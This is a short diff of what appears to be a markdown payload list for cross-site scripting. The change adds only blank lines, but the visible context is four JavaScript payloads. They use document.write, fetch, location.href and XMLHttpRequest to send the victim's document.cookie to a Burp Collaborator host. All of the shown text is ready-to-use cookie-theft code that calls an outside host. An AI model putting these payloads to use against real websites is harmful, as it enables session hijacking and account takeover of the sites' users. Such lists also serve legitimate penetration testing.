@@ -10,11 +10,17 @@
   in **"body"**:
   document.write('<img src="http://burp.oastify.com?c='+document.cookie+'" />')
 ```
+
   or
+  
   `fetch('http://burp.oastify.com?c=' + document.cookie, { mode: 'no-cors' });`
+  
   or
+  
   `location.href = 'http://burp.oastify.com?c=' + document.cookie;`
+  
   or
+  
 ```
   var xhr = new XMLHttpRequest();
   xhr.open('GET', 'http://burp.oastify.com?c=' + document.cookie, true);
